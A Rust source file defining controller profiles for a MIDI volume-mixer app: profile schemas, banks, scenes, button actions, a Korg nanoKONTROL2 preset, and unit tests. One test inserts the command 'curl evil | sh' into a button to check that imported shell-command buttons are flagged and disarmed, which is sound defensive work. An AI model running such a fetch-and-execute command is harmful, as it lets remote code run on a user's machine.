//! Controller profiles.
//!
//! The on-disk schema is compatible with the `spec.json` files used by the
//! Windows MIDI Mixer app, so existing profiles can be imported. Fields this
//! app adds (`assignments`, `buttons`, ...) are skipped when empty, and
//! unknown fields are preserved verbatim.

use std::path::Path;

use anyhow::{Context, Result};
use indexmap::IndexMap;
use rust_i18n::t;
use serde::{Deserialize, Serialize};
use serde_json::Value;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
pub enum ControlKind {
    #[serde(rename = "input-fader")]
    #[default]
    Fader,
    #[serde(rename = "input-button")]
    Button,
    #[serde(rename = "output")]
    Output,
}

impl ControlKind {
    pub const ALL: [ControlKind; 3] = [ControlKind::Fader, ControlKind::Button, ControlKind::Output];
    pub fn label(self) -> String {
        match self {
            ControlKind::Fader => t!("Fader / knob").into(),
            ControlKind::Button => t!("Button").into(),
            ControlKind::Output => t!("Output (LED)").into(),
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
pub enum Command {
    #[serde(rename = "cc")]
    #[default]
    Cc,
    #[serde(rename = "noteon")]
    NoteOn,
    #[serde(rename = "noteoff")]
    NoteOff,
    #[serde(rename = "pitch")]
    Pitch,
    #[serde(rename = "channel aftertouch")]
    ChannelAftertouch,
    #[serde(rename = "poly aftertouch")]
    PolyAftertouch,
    #[serde(rename = "program")]
    Program,
}

impl Command {
    pub const ALL: [Command; 7] = [
        Command::Cc,
        Command::NoteOn,
        Command::NoteOff,
        Command::Pitch,
        Command::ChannelAftertouch,
        Command::PolyAftertouch,
        Command::Program,
    ];
    pub fn label(self) -> &'static str {
        match self {
            Command::Cc => "CC",
            Command::NoteOn => "Note on",
            Command::NoteOff => "Note off",
            Command::Pitch => "Pitch bend",
            Command::ChannelAftertouch => "Channel AT",
            Command::PolyAftertouch => "Poly AT",
            Command::Program => "Program",
        }
    }
    /// Status nibble (upper 4 bits).
    pub fn status(self) -> u8 {
        match self {
            Command::NoteOff => 0x80,
            Command::NoteOn => 0x90,
            Command::PolyAftertouch => 0xA0,
            Command::Cc => 0xB0,
            Command::Program => 0xC0,
            Command::ChannelAftertouch => 0xD0,
            Command::Pitch => 0xE0,
        }
    }
    /// Whether the message carries a control/note number.
    pub fn has_control(self) -> bool {
        matches!(self, Command::Cc | Command::NoteOn | Command::NoteOff | Command::PolyAftertouch)
    }
    pub fn default_max(self) -> u16 {
        if self == Command::Pitch { 16383 } else { 127 }
    }
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Delta {
    #[serde(default = "delta_up")]
    pub up: u8,
    #[serde(default = "delta_down")]
    pub down: u8,
    /// Some profiles keep the step count here instead of on the control.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub steps: Option<u32>,
    #[serde(flatten)]
    pub extra: IndexMap<String, Value>,
}

impl Delta {
    pub fn new(up: u8, down: u8) -> Delta {
        Delta { up, down, steps: None, extra: IndexMap::new() }
    }
}

fn delta_up() -> u8 {
    1
}
fn delta_down() -> u8 {
    65
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
#[serde(rename_all = "camelCase")]
pub struct Control {
    #[serde(default)]
    pub name: String,
    #[serde(rename = "type", default)]
    pub kind: ControlKind,
    #[serde(default)]
    pub channel: u8,
    #[serde(default)]
    pub command: Command,
    #[serde(default)]
    pub control: u8,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub min_value: Option<u16>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub max_value: Option<u16>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub push_value: Option<u16>,
    #[serde(default, skip_serializing_if = "is_false")]
    pub velocity_sensitive: bool,
    #[serde(default, skip_serializing_if = "is_false")]
    pub automatic_indicator: bool,
    /// Relative ("infinite") encoder: values meaning one click up / down.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub delta: Option<Delta>,
    /// Number of encoder clicks from 0% to 100%.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub steps: Option<u32>,
    #[serde(flatten)]
    pub extra: IndexMap<String, Value>,
}

impl Control {
    /// 14-bit pitch-bend faders are motorized on the controllers that use
    /// them (Mackie protocol); we echo positions back to them.
    pub fn is_motorized(&self) -> bool {
        self.command == Command::Pitch && self.delta.is_none()
    }
    pub fn min(&self) -> u16 {
        self.min_value.unwrap_or(0)
    }
    pub fn max(&self) -> u16 {
        self.max_value.unwrap_or_else(|| self.command.default_max())
    }
    /// Encoder clicks from 0 to 100%, if the profile says.
    pub fn step_count(&self) -> Option<u32> {
        self.steps.or_else(|| self.delta.as_ref().and_then(|d| d.steps)).filter(|s| *s > 0)
    }
}

/// The roles a group's controls can play, in the order shown in the UI.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Role {
    Faders,
    Indicators,
    Mute,
    MuteIndicators,
    Assign,
    AssignIndicators,
    Run,
    RunIndicators,
    Meters,
    Balance,
}

impl Role {
    pub const ALL: [Role; 10] = [
        Role::Faders,
        Role::Indicators,
        Role::Mute,
        Role::MuteIndicators,
        Role::Assign,
        Role::AssignIndicators,
        Role::Run,
        Role::RunIndicators,
        Role::Meters,
        Role::Balance,
    ];
    pub fn label(self) -> String {
        match self {
            Role::Faders => t!("Volume").into(),
            Role::Indicators => t!("Volume indicator").into(),
            Role::Mute => t!("Mute").into(),
            Role::MuteIndicators => t!("Mute indicator").into(),
            Role::Assign => t!("Assign").into(),
            Role::AssignIndicators => t!("Assign indicator").into(),
            Role::Run => t!("Run / default").into(),
            Role::RunIndicators => t!("Run indicator").into(),
            Role::Meters => t!("Peak meter").into(),
            Role::Balance => t!("Balance").into(),
        }
    }
    /// Which control kind is expected for this role.
    pub fn wants(self) -> ControlKind {
        match self {
            Role::Faders | Role::Balance => ControlKind::Fader,
            Role::Mute | Role::Assign | Role::Run => ControlKind::Button,
            _ => ControlKind::Output,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
#[serde(rename_all = "camelCase")]
pub struct Group {
    #[serde(default)]
    pub name: String,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub faders: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub indicators: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub mute: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub mute_indicators: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub assign: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub assign_indicators: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub run: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub run_indicators: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub meters: Vec<String>,
    /// Knobs that pan the strip left and right.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub balance: Vec<String>,
    #[serde(flatten)]
    pub extra: IndexMap<String, Value>,
}

impl Group {
    pub fn role(&self, r: Role) -> &Vec<String> {
        match r {
            Role::Faders => &self.faders,
            Role::Indicators => &self.indicators,
            Role::Mute => &self.mute,
            Role::MuteIndicators => &self.mute_indicators,
            Role::Assign => &self.assign,
            Role::AssignIndicators => &self.assign_indicators,
            Role::Run => &self.run,
            Role::RunIndicators => &self.run_indicators,
            Role::Meters => &self.meters,
            Role::Balance => &self.balance,
        }
    }
    pub fn role_mut(&mut self, r: Role) -> &mut Vec<String> {
        match r {
            Role::Faders => &mut self.faders,
            Role::Indicators => &mut self.indicators,
            Role::Mute => &mut self.mute,
            Role::MuteIndicators => &mut self.mute_indicators,
            Role::Assign => &mut self.assign,
            Role::AssignIndicators => &mut self.assign_indicators,
            Role::Run => &mut self.run,
            Role::RunIndicators => &mut self.run_indicators,
            Role::Meters => &mut self.meters,
            Role::Balance => &mut self.balance,
        }
    }
    pub fn uses(&self, control_id: &str) -> bool {
        Role::ALL.iter().any(|r| self.role(*r).iter().any(|c| c == control_id))
    }
}

/// How an application stream is matched. Matching by name (rather than by a
/// PulseAudio index) keeps assignments working across app restarts.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct AppMatch {
    /// Matched against the process binary and the application name.
    pub pattern: String,
    #[serde(default, skip_serializing_if = "is_false")]
    pub regex: bool,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "type", rename_all = "camelCase")]
pub enum Target {
    /// Whatever application owns the focused window.
    Focus,
    /// Application playback streams.
    App {
        m: AppMatch,
        label: String,
    },
    /// Application recording streams (e.g. Discord's microphone capture).
    AppInput {
        m: AppMatch,
        label: String,
    },
    /// Playback streams not matched by any other group.
    Unassigned,
    /// Notification / event sounds.
    EventSounds,
    Output {
        name: String,
        label: String,
    },
    Input {
        name: String,
        label: String,
    },
    DefaultOutput,
    DefaultInput,
}

impl Target {
    pub fn label(&self) -> String {
        match self {
            Target::Focus => t!("Focused app").into(),
            Target::App { label, .. } => label.clone(),
            Target::AppInput { label, .. } => format!("{label} (recording)"),
            Target::Unassigned => t!("All other apps").into(),
            Target::EventSounds => t!("System sounds").into(),
            Target::Output { label, .. } => label.clone(),
            Target::Input { label, .. } => label.clone(),
            Target::DefaultOutput => t!("Default output").into(),
            Target::DefaultInput => t!("Default input").into(),
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum MediaKey {
    PlayPause,
    Play,
    Pause,
    Stop,
    Next,
    Previous,
}

/// Action for a button that is not part of any group.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize, Default)]
#[serde(tag = "type", rename_all = "camelCase")]
pub enum ButtonAction {
    #[default]
    None,
    /// Toggle mute on the given targets.
    Mute {
        targets: Vec<Target>,
    },
    Media {
        key: MediaKey,
        /// Part of the player's name (e.g. "spotify"); empty: whichever is playing.
        #[serde(default, skip_serializing_if = "String::is_empty")]
        player: String,
    },
    /// Run a shell command.
    Command {
        command: String,
    },
    /// Press a key combination such as `ctrl+shift+m` (needs ydotool).
    Keys {
        keys: String,
    },
    /// Set the default output device; several names cycle through them.
    DefaultOutput {
        names: Vec<String>,
    },
    DefaultInput {
        names: Vec<String>,
    },
    /// Switch to another profile.
    Profile {
        id: String,
    },
    /// Go `step` banks forward or back (wrapping). The LED is lit on banks 2+.
    Bank {
        step: i32,
    },
    /// Recall a saved scene.
    Scene {
        name: String,
    },
    /// Mute or unmute every input device. The LED shows the default input's mute.
    MuteInputs,
    /// The default input is unmuted only while the button is held.
    PushToTalk,
    /// The default input is muted only while the button is held.
    PushToMute,
    /// Switch scene, mute a source, or start/stop recording or streaming in OBS.
    Obs {
        op: crate::obs::ObsOp,
    },
    /// Hear an input (or a bus) on an output, live; press again to stop.
    /// Empty names: the default input / output.
    Monitor {
        #[serde(default)]
        source: String,
        #[serde(default)]
        sink: String,
    },
    /// Load an EasyEffects preset (noise suppression on/off, EQ, ...).
    EasyEffects {
        preset: String,
    },
}

impl ButtonAction {
    pub fn label(&self) -> String {
        match self {
            ButtonAction::None => t!("Nothing").into(),
            ButtonAction::Mute { .. } => t!("Toggle mute").into(),
            ButtonAction::Media { .. } => t!("Media key").into(),
            ButtonAction::Command { .. } => t!("Run command").into(),
            ButtonAction::Keys { .. } => t!("Key combination").into(),
            ButtonAction::DefaultOutput { .. } => t!("Set/cycle default output").into(),
            ButtonAction::DefaultInput { .. } => t!("Set/cycle default input").into(),
            ButtonAction::Profile { .. } => t!("Switch profile").into(),
            ButtonAction::Bank { .. } => t!("Previous/next bank").into(),
            ButtonAction::Scene { .. } => t!("Recall scene").into(),
            ButtonAction::MuteInputs => t!("Mute all inputs").into(),
            ButtonAction::PushToTalk => t!("Push to talk").into(),
            ButtonAction::PushToMute => t!("Push to mute").into(),
            ButtonAction::Obs { .. } => t!("OBS Studio").into(),
            ButtonAction::Monitor { .. } => t!("Hear yourself (monitor)").into(),
            ButtonAction::EasyEffects { .. } => t!("EasyEffects preset").into(),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct GroupSettings {
    #[serde(default)]
    pub targets: Vec<Target>,
    /// Upper volume limit applied to this group's targets (1.0 = 100%).
    #[serde(default = "one", skip_serializing_if = "is_one")]
    pub max_volume: f32,
    /// Volume at the bottom of the fader.
    #[serde(default, skip_serializing_if = "is_zero_f32")]
    pub min_volume: f32,
    /// This strip's own volume curve, instead of the one in Settings.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub curve: Option<f32>,
    /// How the mixer draws this group; guessed from the controls if unset.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub widget: Option<Widget>,
    /// Name shown on the strip instead of the group name.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub label: Option<String>,
    /// Index into the strip colours; the accent colour if unset.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub color: Option<u8>,
    /// Icon name shown on the strip instead of the target's own icon.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub icon: Option<String>,
    /// While this strip plays, turn the apps on other strips down.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub duck: Option<Duck>,
    /// Left/right balance of this strip's streams, -1 to 1; unset leaves
    /// them as they are.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub balance: Option<f32>,
}

#[derive(Debug, Clone, Copy, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Duck {
    /// How far the other apps go down, in dB (negative).
    pub amount_db: f32,
    /// Peak level (0..=1) above which this strip counts as playing.
    pub threshold: f32,
}

impl Default for Duck {
    fn default() -> Self {
        Duck { amount_db: -12.0, threshold: 0.04 }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum Widget {
    Fader,
    Knob,
}

impl Default for GroupSettings {
    fn default() -> Self {
        Self {
            targets: Vec::new(),
            max_volume: 1.0,
            min_volume: 0.0,
            curve: None,
            widget: None,
            label: None,
            color: None,
            icon: None,
            duck: None,
            balance: None,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
#[serde(rename_all = "camelCase")]
pub struct Profile {
    #[serde(default)]
    pub name: String,
    /// Input port name (substring match, case-insensitive).
    #[serde(default)]
    pub input: String,
    #[serde(default)]
    pub output: String,
    #[serde(default, skip_serializing_if = "is_false")]
    pub preset: bool,
    #[serde(default)]
    pub controls: IndexMap<String, Control>,
    #[serde(default)]
    pub groups: IndexMap<String, Group>,
    /// Group id -> what it controls (bank 1).
    #[serde(default, skip_serializing_if = "IndexMap::is_empty")]
    pub assignments: IndexMap<String, GroupSettings>,
    /// Assignments of banks 2, 3, ...
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub banks: Vec<IndexMap<String, GroupSettings>>,
    /// The active bank (0 = `assignments`).
    #[serde(default, skip_serializing_if = "is_zero")]
    pub bank: usize,
    /// Saved volume/mute snapshots by name.
    #[serde(default, skip_serializing_if = "IndexMap::is_empty")]
    pub scenes: IndexMap<String, Scene>,
    /// Button control id -> action (for buttons outside groups).
    #[serde(default, skip_serializing_if = "IndexMap::is_empty")]
    pub buttons: IndexMap<String, ButtonAction>,
    /// Switch bank or scene while certain apps have focus.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub auto: Vec<AutoRule>,
    #[serde(flatten)]
    pub extra: IndexMap<String, Value>,
}

/// While a matching app has focus, switch to a bank or recall a scene;
/// afterwards, go back.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct AutoRule {
    pub app: AppMatch,
    /// Shown in the editor ("Firefox").
    #[serde(default)]
    pub label: String,
    pub action: AutoAction,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(tag = "type", rename_all = "camelCase")]
pub enum AutoAction {
    Bank { bank: usize },
    Scene { name: String },
}

/// Volume position (0..=1) and mute of every strip, per bank.
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
pub struct Scene {
    pub bank: usize,
    pub strips: IndexMap<String, SceneStrip>,
}

#[derive(Debug, Clone, Copy, PartialEq, Serialize, Deserialize)]
pub struct SceneStrip {
    pub position: f32,
    pub mute: bool,
}

fn is_zero(n: &usize) -> bool {
    *n == 0
}

impl Profile {
    pub fn bank_count(&self) -> usize {
        1 + self.banks.len()
    }

    /// Assignments of the active bank.
    pub fn current(&self) -> &IndexMap<String, GroupSettings> {
        match self.bank {
            0 => &self.assignments,
            n => self.banks.get(n - 1).unwrap_or(&self.assignments),
        }
    }

    pub fn current_mut(&mut self) -> &mut IndexMap<String, GroupSettings> {
        if self.bank > self.banks.len() {
            self.bank = 0;
        }
        match self.bank {
            0 => &mut self.assignments,
            n => &mut self.banks[n - 1],
        }
    }

    /// Move `step` banks forward or back, wrapping around. Returns the new bank.
    pub fn step_bank(&mut self, step: i32) -> usize {
        let n = self.bank_count() as i32;
        self.bank = (self.bank as i32 + step).rem_euclid(n) as usize;
        self.bank
    }

    /// Remove bank `i` (bank 1 can't be removed, only cleared). Scenes
    /// and focus rules that named a later bank follow it down; those on
    /// the removed bank move to bank 1.
    pub fn remove_bank(&mut self, i: usize) {
        if i == 0 {
            self.assignments.values_mut().for_each(|a| a.targets.clear());
        } else if i <= self.banks.len() {
            self.banks.remove(i - 1);
            let renumber = |b: &mut usize| {
                if *b == i {
                    *b = 0;
                } else if *b > i {
                    *b -= 1;
                }
            };
            self.scenes.values_mut().for_each(|s| renumber(&mut s.bank));
            for rule in &mut self.auto {
                if let AutoAction::Bank { bank } = &mut rule.action {
                    renumber(bank);
                }
            }
        }
        if self.bank >= self.bank_count() {
            self.bank = self.bank_count() - 1;
        }
    }

    pub fn load(path: &Path) -> Result<Profile> {
        let text = std::fs::read_to_string(path).with_context(|| format!("reading {}", path.display()))?;
        let p: Profile = serde_json::from_str(&text).with_context(|| format!("parsing {}", path.display()))?;
        Ok(p)
    }

    /// Buttons that run a command or press keys, described for a warning.
    /// A profile from somewhere else could use them to run anything.
    pub fn risky_buttons(&self) -> Vec<String> {
        let name = |cid: &str| self.controls.get(cid).map_or(cid.to_string(), |c| c.name.clone());
        self.buttons
            .iter()
            .filter_map(|(cid, a)| match a {
                ButtonAction::Command { command } => Some(format!("{}: runs `{command}`", name(cid))),
                ButtonAction::Keys { keys } => Some(format!("{}: presses {keys}", name(cid))),
                _ => None,
            })
            .collect()
    }

    /// Turn the buttons from [`Profile::risky_buttons`] off.
    pub fn disarm(&mut self) {
        for a in self.buttons.values_mut() {
            if matches!(a, ButtonAction::Command { .. } | ButtonAction::Keys { .. }) {
                *a = ButtonAction::None;
            }
        }
    }

    /// The profile in the original app's format (without this app's extras).
    pub fn to_spec_json(&self) -> Result<String> {
        let mut p = self.clone();
        p.assignments.clear();
        p.banks.clear();
        p.bank = 0;
        p.scenes.clear();
        p.buttons.clear();
        p.auto.clear();
        p.preset = false;
        Ok(serde_json::to_string_pretty(&p)?)
    }

    /// Buttons that are not used by any group.
    pub fn spare_buttons(&self) -> Vec<String> {
        self.controls
            .iter()
            .filter(|(id, c)| c.kind == ControlKind::Button && !self.groups.values().any(|g| g.uses(id)))
            .map(|(id, _)| id.clone())
            .collect()
    }

    /// Remove a control and every reference to it.
    pub fn remove_control(&mut self, id: &str) {
        self.controls.shift_remove(id);
        for g in self.groups.values_mut() {
            for r in Role::ALL {
                g.role_mut(r).retain(|c| c != id);
            }
        }
        self.buttons.shift_remove(id);
    }

    pub fn control_name(&self, id: &str) -> String {
        self.controls.get(id).map(|c| c.name.clone()).unwrap_or_else(|| "?".into())
    }

    /// Default Korg nanoKONTROL2 layout (factory CC mode). Eight strips of
    /// fader + S/M/R buttons, eight knob groups and media transport buttons.
    pub fn nanokontrol2() -> Profile {
        let mut p = Profile {
            name: "Korg nanoKONTROL2".into(),
            input: "nanoKONTROL2".into(),
            output: "nanoKONTROL2".into(),
            ..Default::default()
        };
        let add = |p: &mut Profile, name: String, kind: ControlKind, cc: u8, auto: bool| -> String {
            let id = new_id();
            p.controls.insert(
                id.clone(),
                Control { name, kind, control: cc, automatic_indicator: auto, ..Default::default() },
            );
            id
        };
        let mut knob_groups = Vec::new();
        for i in 0..8u8 {
            let n = i + 1;
            let fader = add(&mut p, format!("Fader {n}"), ControlKind::Fader, i, false);
            let knob = add(&mut p, format!("Knob {n}"), ControlKind::Fader, 16 + i, false);
            let s = add(&mut p, format!("S {n}"), ControlKind::Button, 32 + i, true);
            let m = add(&mut p, format!("M {n}"), ControlKind::Button, 48 + i, true);
            let r = add(&mut p, format!("R {n}"), ControlKind::Button, 64 + i, true);
            p.groups.insert(
                new_id(),
                Group {
                    name: format!("Fader {n}"),
                    faders: vec![fader],
                    mute: vec![m.clone()],
                    mute_indicators: vec![m],
                    assign: vec![s.clone()],
                    assign_indicators: vec![s],
                    run: vec![r.clone()],
                    run_indicators: vec![r],
                    ..Default::default()
                },
            );
            knob_groups.push((n, knob));
        }
        for (n, knob) in knob_groups {
            p.groups.insert(new_id(), Group { name: format!("Knob {n}"), faders: vec![knob], ..Default::default() });
        }
        let transport = [
            ("Track <", 58, Some(ButtonAction::Bank { step: -1 })),
            ("Track >", 59, Some(ButtonAction::Bank { step: 1 })),
            ("Cycle", 46, Some(ButtonAction::Bank { step: 1 })),
            ("Marker set", 60, None),
            ("Marker <", 61, None),
            ("Marker >", 62, None),
            ("Rewind", 43, Some(ButtonAction::Media { key: MediaKey::Previous, player: String::new() })),
            ("Fast forward", 44, Some(ButtonAction::Media { key: MediaKey::Next, player: String::new() })),
            ("Stop", 42, Some(ButtonAction::Media { key: MediaKey::Stop, player: String::new() })),
            ("Play", 41, Some(ButtonAction::Media { key: MediaKey::PlayPause, player: String::new() })),
            ("Record", 45, Some(ButtonAction::MuteInputs)),
        ];
        for (name, cc, action) in transport {
            let id = add(&mut p, name.into(), ControlKind::Button, cc, false);
            if let Some(action) = action {
                p.buttons.insert(id, action);
            }
        }
        p
    }
}

pub fn new_id() -> String {
    ulid::Ulid::generate().to_string()
}

fn is_false(b: &bool) -> bool {
    !*b
}
fn one() -> f32 {
    1.0
}
fn is_zero_f32(v: &f32) -> bool {
    *v == 0.0
}
fn is_one(v: &f32) -> bool {
    (*v - 1.0).abs() < f32::EPSILON
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn imported_commands_are_disarmed() {
        let mut p = Profile::nanokontrol2();
        let (play, stop) = {
            let mut ids = p.buttons.keys().cloned();
            (ids.next().unwrap(), ids.next().unwrap())
        };
        p.buttons.insert(play, ButtonAction::Command { command: "curl evil | sh".into() });
        p.buttons.insert(stop, ButtonAction::Keys { keys: "ctrl+alt+t".into() });
        let risky = p.risky_buttons();
        assert_eq!(risky.len(), 2, "{risky:?}");
        assert!(risky[0].contains("curl evil | sh"));
        p.disarm();
        assert!(p.risky_buttons().is_empty());
        // Other buttons are left alone.
        assert!(p.buttons.values().any(|a| matches!(a, ButtonAction::Bank { .. })));
    }

    #[test]
    fn group_settings_compat() {
        // Written before names, colours, icons and ducking existed.
        let old: GroupSettings =
            serde_json::from_str(r#"{"targets":[{"type":"defaultOutput"}],"maxVolume":0.8}"#).unwrap();
        assert_eq!((old.label, old.color, old.icon, old.duck), (None, None, None, None));
        // Unset fields stay out of the file.
        let json = serde_json::to_string(&GroupSettings::default()).unwrap();
        assert_eq!(json, r#"{"targets":[]}"#);
        let g = GroupSettings { label: Some("Music".into()), duck: Some(Duck::default()), ..Default::default() };
        let back: GroupSettings = serde_json::from_str(&serde_json::to_string(&g).unwrap()).unwrap();
        assert_eq!(back.label.as_deref(), Some("Music"));
        assert_eq!(back.duck, Some(Duck::default()));
    }

    /// Profiles shipped with MIDI Mixer for Windows. They aren't part of this
    /// repository; point `SLIDEWIRE_WINDOWS_PROFILES` at an extracted copy.
    fn original_profiles() -> std::path::PathBuf {
        std::env::var_os("SLIDEWIRE_WINDOWS_PROFILES")
            .map(Into::into)
            .unwrap_or_else(|| concat!(env!("CARGO_MANIFEST_DIR"), "/../midimixer/app/profiles").into())
    }

    #[test]
    fn imports_original_profiles() {
        let Ok(dir) = std::fs::read_dir(original_profiles()) else {
            eprintln!("Windows profiles not present, skipping");
            return;
        };
        let mut n = 0;
        for e in dir.flatten() {
            let spec = e.path().join("spec.json");
            if spec.exists() {
                let p = Profile::load(&spec).unwrap();
                assert!(!p.name.is_empty());
                for g in p.groups.values() {
                    for r in Role::ALL {
                        for c in g.role(r) {
                            assert!(p.controls.contains_key(c), "{}: dangling {c}", p.name);
                        }
                    }
                }
                // Round trip keeps the original information.
                let again: Profile = serde_json::from_str(&p.to_spec_json().unwrap()).unwrap();
                assert_eq!(again.controls.len(), p.controls.len());
                n += 1;
            }
        }
        assert!(n > 0);
    }

    #[test]
    fn nanokontrol2_import_defaults() {
        let path = original_profiles().join("01FP5SAZEBEABK1EGBHNJEZHW8/spec.json");
        if !path.exists() {
            return;
        }
        let p = Profile::load(&path).unwrap();
        let fader = p.controls.values().find(|c| c.name == "Fader 1").unwrap();
        assert_eq!(fader.command, Command::Cc);
        assert_eq!(fader.channel, 0);
        assert_eq!(fader.max(), 127);
    }

    #[test]
    fn builtin_nanokontrol2() {
        let p = Profile::nanokontrol2();
        assert_eq!(p.groups.len(), 16);
        assert_eq!(p.spare_buttons().len(), 11);
        assert_eq!(p.buttons.len(), 8);
    }

    #[test]
    fn target_serde() {
        let t = Target::App { m: AppMatch { pattern: "firefox".into(), regex: false }, label: "Firefox".into() };
        let s = serde_json::to_string(&t).unwrap();
        assert_eq!(serde_json::from_str::<Target>(&s).unwrap(), t);
    }

    #[test]
    fn banks() {
        let mut p = Profile::nanokontrol2();
        let gid = p.groups.keys().next().unwrap().clone();
        p.current_mut().entry(gid.clone()).or_default().targets.push(Target::DefaultOutput);
        assert_eq!(p.bank_count(), 1);
        // One bank: stepping stays put.
        assert_eq!(p.step_bank(1), 0);
        p.banks.push(Default::default());
        p.banks.push(Default::default());
        assert_eq!(p.step_bank(1), 1);
        assert!(p.current().get(&gid).is_none(), "bank 2 starts empty");
        assert_eq!(p.step_bank(-2), 2, "wraps backwards");
        assert_eq!(p.step_bank(1), 0, "wraps forwards");
        assert_eq!(p.current()[&gid].targets, vec![Target::DefaultOutput]);
        // Removing the active last bank moves to the one before.
        p.bank = 2;
        p.remove_bank(2);
        assert_eq!((p.bank, p.bank_count()), (1, 2));
        // A stale bank index falls back to bank 1.
        p.bank = 7;
        assert!(p.current().contains_key(&gid));
        // Old profiles without banks load, and round-trip without new fields.
        let json = serde_json::to_string(&Profile::nanokontrol2()).unwrap();
        assert!(!json.contains("\"banks\":") && !json.contains("\"bank\":"));
        let back: Profile = serde_json::from_str(&json).unwrap();
        assert_eq!(back.bank_count(), 1);
    }

    #[test]
    fn removing_a_bank_renumbers_scenes_and_rules() {
        let mut p = Profile::nanokontrol2();
        p.banks = vec![Default::default(), Default::default(), Default::default()];
        for (name, bank) in [("one", 0), ("two", 1), ("three", 2), ("four", 3)] {
            p.scenes.insert(name.into(), Scene { bank, ..Default::default() });
        }
        let rule = |bank| AutoRule {
            app: AppMatch { pattern: "game".into(), regex: false },
            label: String::new(),
            action: AutoAction::Bank { bank },
        };
        p.auto = vec![rule(1), rule(3)];
        p.remove_bank(1);
        let banks: Vec<usize> = p.scenes.values().map(|s| s.bank).collect();
        assert_eq!(banks, [0, 0, 1, 2]);
        assert_eq!(p.auto, [rule(0), rule(2)]);
        // Clearing bank 1 changes nothing else.
        p.remove_bank(0);
        assert_eq!(p.scenes.values().map(|s| s.bank).collect::<Vec<_>>(), [0, 0, 1, 2]);
    }
}
